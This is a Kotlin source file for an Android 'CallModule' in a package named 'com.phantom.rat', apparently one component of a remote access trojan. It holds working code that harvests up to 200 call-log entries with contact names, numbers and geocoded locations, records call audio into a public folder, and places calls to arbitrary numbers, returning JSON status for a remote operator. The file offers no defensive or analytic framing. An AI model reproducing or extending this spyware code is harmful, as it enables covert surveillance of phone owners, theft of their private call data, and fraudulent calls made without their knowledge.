package com.phantom.rat.modules

import android.Manifest
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.CallLog
import android.media.MediaRecorder
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class CallModule(private val context: Context) {

    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var currentRecordingFile: File? = null

    fun getCallLogs(): JSONObject {
        val result = JSONObject()
        val callLogs = JSONArray()
        
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                "${CallLog.Calls.DATE} DESC LIMIT 200"
            )
            
            cursor?.use {
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
                val countryIsoIndex = it.getColumnIndex(CallLog.Calls.COUNTRY_ISO)
                val geocodedLocationIndex = it.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION)
                
                while (it.moveToNext()) {
                    val call = JSONObject().apply {
                        put("name", if (nameIndex >= 0) it.getString(nameIndex) ?: "" else "")
                        put("number", if (numberIndex >= 0) it.getString(numberIndex) ?: "" else "")
                        put("type", if (typeIndex >= 0) convertCallType(it.getInt(typeIndex)) else "unknown")
                        put("date", if (dateIndex >= 0) it.getLong(dateIndex) else 0L)
                        put("date_formatted", if (dateIndex >= 0) 
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                                .format(Date(it.getLong(dateIndex))) else "")
                        put("duration", if (durationIndex >= 0) it.getLong(durationIndex) else 0L)
                        put("duration_formatted", if (durationIndex >= 0) 
                            formatDuration(it.getLong(durationIndex)) else "0:00")
                        put("country", if (countryIsoIndex >= 0) it.getString(countryIsoIndex) ?: "" else "")
                        put("location", if (geocodedLocationIndex >= 0) it.getString(geocodedLocationIndex) ?: "" else "")
                    }
                    callLogs.put(call)
                }
            }
            
            result.put("status", "success")
            result.put("count", callLogs.length())
            result.put("calls", callLogs)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Permission denied or unknown error")
        }
        
        return result
    }

    fun recordCall(): JSONObject {
        val result = JSONObject()
        
        try {
            if (isRecording) {
                stopRecording()
                result.put("status", "success")
                result.put("message", "Recording stopped")
                result.put("file", currentRecordingFile?.absolutePath ?: "")
                return result
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                    result.put("status", "error")
                    result.put("message", "Record audio permission not granted")
                    return result
                }
            }
            
            val recordingsDir = File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC),
                "CallRecordings"
            )
            recordingsDir.mkdirs()
            
            val fileName = "call_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
                .format(Date())}.mp3"
            currentRecordingFile = File(recordingsDir, fileName)
            
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioBitRate(128000)
                setAudioChannels(1)
                setOutputFile(currentRecordingFile?.absolutePath)
                
                try {
                    prepare()
                    start()
                    isRecording = true
                    
                    result.put("status", "success")
                    result.put("message", "Recording started")
                    result.put("file", currentRecordingFile?.absolutePath)
                    
                } catch (e: Exception) {
                    result.put("status", "error")
                    result.put("message", "Failed to start recording: ${e.message}")
                }
            }
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Unknown error")
        }
        
        return result
    }

    fun stopRecording(): JSONObject {
        val result = JSONObject()
        
        try {
            if (isRecording && mediaRecorder != null) {
                mediaRecorder?.apply {
                    stop()
                    release()
                }
                mediaRecorder = null
                isRecording = false
                
                result.put("status", "success")
                result.put("message", "Recording stopped")
                result.put("file", currentRecordingFile?.absolutePath ?: "")
                result.put("size", currentRecordingFile?.length() ?: 0)
            } else {
                result.put("status", "error")
                result.put("message", "No active recording")
            }
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Unknown error")
        }
        
        return result
    }

    fun makeCall(number: String): JSONObject {
        val result = JSONObject()
        
        try {
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$number")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE)
                    != PackageManager.PERMISSION_GRANTED) {
                    result.put("status", "error")
                    result.put("message", "Call phone permission not granted")
                    return result
                }
            }
            
            context.startActivity(intent)
            
            result.put("status", "success")
            result.put("message", "Calling $number")
            result.put("number", number)
            
        } catch (e: Exception) {
            result.put("status", "error")
            result.put("message", e.message ?: "Failed to make call")
        }
        
        return result
    }

    private fun convertCallType(type: Int): String {
        return when (type) {
            CallLog.Calls.INCOMING_TYPE -> "incoming"
            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
            CallLog.Calls.MISSED_TYPE -> "missed"
            CallLog.Calls.VOICEMAIL_TYPE -> "voicemail"
            CallLog.Calls.REJECTED_TYPE -> "rejected"
            CallLog.Calls.BLOCKED_TYPE -> "blocked"
            else -> "unknown"
        }
    }

    private fun formatDuration(seconds: Long): String {
        val mins = seconds / 60
        val secs = seconds % 60
        return String.format(Locale.US, "%d:%02d", mins, secs)
    }
}
